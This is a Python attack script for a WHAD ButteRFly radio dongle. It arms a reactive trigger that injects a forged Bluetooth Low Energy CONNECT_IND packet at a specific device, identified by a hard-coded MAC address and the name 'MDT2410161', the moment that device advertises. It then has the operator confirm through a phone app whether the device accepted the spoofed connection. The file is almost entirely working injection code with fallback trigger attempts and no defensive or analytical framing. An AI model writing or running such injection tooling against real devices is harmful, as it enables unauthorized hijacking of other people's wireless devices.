#!/usr/bin/env python3
# v4 - reactive injection: ReceptionTrigger watches for the device's ADV_IND,
# firmware transmits OUR literal 36-byte CONNECT_IND within 150 us.
import argparse, inspect, time

def _parse_args():
    p = argparse.ArgumentParser(description="Arm a reactive CONNECT_IND injection trigger on a WHAD ButteRFly.")
    p.add_argument("mac", nargs="?", default="C0:00:00:41:73:AC", help="target MAC (default: %(default)s)")
    p.add_argument("--window", type=int, default=120, help="watch window in seconds (default: %(default)s)")
    p.add_argument("--port", default="uart0", help="WHAD dongle port (default: %(default)s)")
    return p.parse_args()

ARGS = _parse_args()

PDU_HEX = "8522AABBCCDDEEFFAC73410000C0A1B2C3D412345602000018000000C800FFFFFFFF1F2D"
TARGET, WINDOW = ARGS.mac, ARGS.window
ADVA_WIRE = bytes.fromhex(TARGET.replace(":", ""))[::-1]     # wire order
RAW = bytes.fromhex(PDU_HEX)

from whad.device import WhadDevice
from whad.ble.connector import Injector
from whad.common.triggers import ReceptionTrigger

print("== ReceptionTrigger source (first 25 lines) ==")
print("\n".join(inspect.getsource(ReceptionTrigger).splitlines()[:25]))

from scapy.layers.bluetooth4LE import BTLE, BTLE_ADV_IND
PKT = BTLE(bytes.fromhex("D6BE898E") + RAW)
assert bytes(PKT)[4:] == RAW, "round-trip mismatch"
ADV_PKT = BTLE_ADV_IND(AdvA=TARGET)          # model of the device's ADV_IND

inj = Injector(WhadDevice.create("uart0"))
try: inj.start()
except Exception as e: print(f"[i] start(): {type(e).__name__}: {e} (continuing)")

armed = False
attempts = [
    ("packet=ADV_PKT (auto-pattern)",      dict(packet=ADV_PKT)),
    ("pattern=AdvA @ offset 2",            dict(pattern=ADVA_WIRE, mask=b"\xff"*6, offset=2)),
    ("pattern=AdvA @ offset 0",            dict(pattern=ADVA_WIRE, mask=b"\xff"*6, offset=0)),
    ("pattern=AdvA only",                  dict(pattern=ADVA_WIRE)),
]
for name, kw in attempts:
    try:
        trig = ReceptionTrigger(**kw)
        inj.prepare(PKT, trigger=trig)
        inj.trigger(trig)
        print(f"[+] ARMED reactively: {name}")
        armed = True
        break
    except Exception as e:
        print(f"[-] {name}: {type(e).__name__}: {e}")

if not armed:
    print("\n[!] none armed -> run: cat inject_api.txt  and paste it to me")
    raise SystemExit(1)

print(f"\n[+] WATCHING for ADV_IND from {TARGET}")
print("[i] NOW: put device in pairing mode, watch 'MDT2410161' in nRF Connect (phone):")
print("    VANISHES = it accepted YOUR packet (believes it is connected)")
print("    returns  = expected cycle: nobody sent first anchor PDU -> it timed out")
t0 = time.time()
try:
    while time.time() - t0 < WINDOW:
        left = int(WINDOW - (time.time() - t0))
        print(f"    ...armed, {left}s left", flush=True)
        time.sleep(10)
except KeyboardInterrupt:
    print("\n[i] interrupted by user")
print("[*] window closed")
